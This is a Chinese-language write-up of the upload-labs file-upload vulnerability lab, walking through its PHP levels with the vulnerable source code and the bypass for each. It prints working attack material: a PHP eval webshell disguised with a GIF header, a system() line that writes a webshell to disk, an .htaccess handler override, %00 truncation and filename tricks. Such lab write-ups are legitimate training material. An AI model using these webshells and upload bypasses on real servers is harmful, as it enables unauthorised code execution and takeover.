---
title: upload-labs writeup
author: Loong716
date: 2019-08-15 14:10:00 +0800
categories: [Web]
tags: [File_Upload]
---

> upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。

项目地址：https://github.com/c0ny1/upload-labs

* toc
{:toc}

## 实验环境

服务器： 

win7 + php 5.2.17 + Apache

且关闭magic_quotes_gpc

## Pass-01

本关先尝试上传一个shell.php，然后弹窗显示不能上传php，显然是前端使用js限制了文件类型

先修改文件名为shell.jpg，然后在上传时抓包修改文件名为shell.php，成功上传

## Pass-02

经过fuzz后发现扩展名无法绕过（尝试了大小写、php5等），那么就修改`content-type`为`image/jpeg`，成功上传

查看源码，发现确实是检测了`content-type`：
``` php
...
if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif'))
...
```

## Pass-03

这一关直接改扩展名为php5即可成功上传，后端应该是用了黑名单来过滤

查看源码，果然是用了黑名单，而且还将扩展名转换为小写，无法大小写来绕过
``` php
...
$deny_ext = array('.asp','.aspx','.php','.jsp');
...
```

## Pass-04

经过fuzz后发现phP、php5、pht等都无法绕过，但尝试随便改一个扩展名为aaa的却上传成功了，看来还是黑名单过滤，那么我们就可以上传一个**.htaccess**文件

``` html
<FilesMatch "shell">
  SetHandler application/x-httpd-php
</FilesMatch>
```

这样我们再上传一个shell.jpg的一句话图片马，就可以被Apache作为php文件解析了，尝试用菜刀连接成功

查看源码发现确实是一个很长的黑名单，过滤掉了许多扩展名
``` php
...
$deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
...
```


## Pass-05

这次直接传一个扩展名是aaa的，发现上传成功，看来还是黑名单过滤，而且这次把.htaccess也给过滤掉了

但经过fuzz后发现这次使用PhP这样的大小写混淆可以成功绕过，看一下源码：

``` php
...
if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
...
```

可以看到这次是没有对扩展名进行统一大小写的，因此就出现了大小写能绕过的情况


## Pass-06

这个上来还是先传扩展名是aaa的，发现仍然是黑名单，经过fuzz大小写、特殊扩展名、.htaccess都不行

看了源码才发现没做去掉两边空格，那么传一个`shell.php `就可以了

源码：
``` php
...
if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
...
```

## Pass-07

依旧是传aaa，发现还是黑名单，再按之前的方法fuzz一遍，发现都不行，比对了一下源码，发现没有删除文件末尾的点，于是上传`shell.php.`，然后windows会默认删除掉文件最后的点，于是成功getshell

## Pass-08

这个仍然是黑名单过滤，但没有过滤最后的`::$DATA`，于是上传`shell.php::$DATA`，成功上传，去掉`::$DATA`之后的URL就是shell地址了

## Pass-09

这个是审计了源码才得到方法，贴一下完整的源码：
``` php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```
注意这一句：
``` php
$img_path = UPLOAD_PATH.'/'.$file_name;
```
判断是否在黑名单内判断的是经过处理后的`$file_ext`，而拼接到路径里的是只经过首尾去空和删除末尾点处理的`$file_name`，因此我们构造"shell.php. ."（最后是：点-空格-点）

那么最终`$file_ext`的值为`.php.`，可以绕过黑名单；`$file_name`的值为`shell.php. `，在windows下会自动删除后面的点和空格，因此可成功getshell

## Pass-10

这个直接审计源码：

``` php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,"", $file_name);
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH.'/'.$file_name;        
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```
虽然还是黑名单，但不是判断扩展名是否在黑名单中，而是当上传文件的扩展名存在于黑名单中时会被替换为空，因此我们可以双写绕过，即上传`shell.phphpp`，成功上传得到shell.php

## Pass-11

直接审计源码吧：

``` php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

这次是改为了白名单，限制了只能上传jpg等图片格式，但在最后拼接`$img_path`的时候并没有过滤`$_GET['save_path']`的值，又因为实验环境**php < 5.3.4**且关闭了**GPC**，因此可以使用`%00`截断

理论payload为：`?save_path=../upload/shell.php%00`

## Pass-12

查看源码，这次和Pass-11基本一样，区别在这一句：
``` php
$img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```

这里换成了用POST方式来接收参数save_path，因此这里仍然可以使用`%00`截断

但是因为是POST传参，因此应该修改数据包中`%00`的16进制值为00，这样才能截断成功

## Pass-13

Pass13~16的题目要求有些变化：

> 任务
> 
> 上传图片马到服务器。
> 
> 注意：
> 
> 1.保证上传后的图片马中仍然包含完整的一句话或webshell代码。
> 
> 2.使用文件包含漏洞能运行图片马中的恶意代码。
> 
> 3.图片马要.jpg,.png,.gif三种后缀都上传成功才算过关！

我们看一下源码：

``` php
<?php
function getReailFileType($filename){
    $file = fopen($filename, "rb");
    $bin = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo = @unpack("C2chars", $bin);    
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
    $fileType = '';    
    switch($typeCode){      
        case 255216:            
            $fileType = 'jpg';
            break;
        case 13780:            
            $fileType = 'png';
            break;        
        case 7173:            
            $fileType = 'gif';
            break;
        default:            
            $fileType = 'unknown';
        }    
        return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_type = getReailFileType($temp_file);

    if($file_type == 'unknown'){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
?>
```
审计了一下源码，很明显是检测文件头。因为gif的文件头是`GIF89a`，因此我们就不使用winhex修改了，直接写一个这样的图片马：

``` php
GIF89a
<?php @eval($_POST['pass']);?>
```

然后使用题目提供的文件包含成功getshell。至于jpg、png可以使用winhex添加16进制的文件头，即可绕过对文件头的检测

## Pass-14

查看一下源码：
``` php
function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)>=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

关于`image_type_to_extension()`的介绍：
> string image_type_to_extension ( int $imagetype [, bool $include_dot = TRUE ] )
> 根据给定的常量 IMAGETYPE_XXX 返回后缀名。

其实这一关仍然是检测文件头，使用Pass-13的方法即可绕过

## Pass-15

看一下源码，与前两关大同小异，主要是利用了php的exif模块的`exif_imagetype()`函数来判断文件类型（需要开启exif模块）

``` php
function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return "gif";
            break;
        case IMAGETYPE_JPEG:
            return "jpg";
            break;
        case IMAGETYPE_PNG:
            return "png";
            break;    
        default:
            return false;
            break;
    }
}
...
```

其实这还是对文件头的检测，用Pass-13的方法即可绕过

## Pass-16

源码：
``` php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
...
```

审计后可以得出如果我们想成功上传需要满足以下条件：

1. 文件的扩展名必须为jpg \| png \| gif
2. 数据包中的content-type必须为image/jpeg \| image/png \| image/gif
3. 文件头必须是图片格式的文件头

我一开始是上传了一个名为shell.gif的图片马，内容和Pass-13的图片马一样，然后抓包修改`content-type`为image/gif，但上传失败了，提示：**该文件不是gif格式的图片！**

之后我又尝试了使用`copy`命令制作图片马：
``` htmlbars
C:\Users\pc\Desktop>copy test.gif /b + shell.php /a shell.gif
test.gif
shell.php
已复制         1 个文件。
```
但上传的shell.gif无法用菜刀连接，我把上传目录里的13168.gif放在本地和shell.gif对比了一下，发现其中的一句话被删除了，应该是图片经过二次渲染导致的

这道题暂时还没找到绕过方法

## Pass-17

源码如下：

``` php
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}
```

审计可以得到代码的逻辑是这样的：

-> 首先使用`move_uploaded_file()`函数将文件移动到上传目录

-> 判断扩展名是否为jpg \| png \| gif，如果是则重命名，如果不是则删除文件

那么这里考察的应该是条件竞争了，方法就是在上传一个test.php，文件内容为：

``` php
<?php system("echo '<?php @eval($_POST[pass]);?>' > shell.php");?>
```

然后我们通过一个python多进程脚本来上传并访问该文件，如果能在文件被删除前访问到test.php，那么就会把一句话写入当前目录的shell.php，成功getshell

## Pass-18

这一关有疑问，搞明白再来写

## Pass-19

源码如下：

``` php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = $_POST['save_name'];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = '上传出错！';
            }
        }else{
            $msg = '禁止保存为该类型文件！';
        }

    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```
可以看到`$file_name`是可控的，那么这里仍然可以使用`%00`截断

抓包修改filename为：`shell.php%00.jpg`，然后将`%00`使用burp的url解码，发包即可成功上传

**这个利用的是：CVE-2015-2348，影响php 5.4.38~5.6.6（原本存在%00截断的版本也受影响）**

## Pass-20

源码：

``` php
$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            $file = explode('.', strtolower($file));
        }

        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}
```
审计后发现代码逻辑如下：

-> 将POST传参的`save_name`赋值给`$file`

-> 若`$file`不是数组则以`.`分割为数组，反之跳过 

-> 判断数组`$file`的最后一个值是否是jpg \| png \| gif，若不是则失败，反之继续 

-> 使用`reset($file) . '.' . $file[count($file) - 1]`的方式拼接`$file_name`

-> `UPLOAD_PATH . '/' .$file_name`拼接`$img_path`

那么我们就可以传入结构为这样的save_name数组：
``` json
Array
(
    [0] => shell.php/
    [2] => jpg
)
```

那么最后`$file[count($file) - 1]`就会为空，`$file_name`变为`shell.php/.`

最终系统会忽略`/.`，导致文件上传 
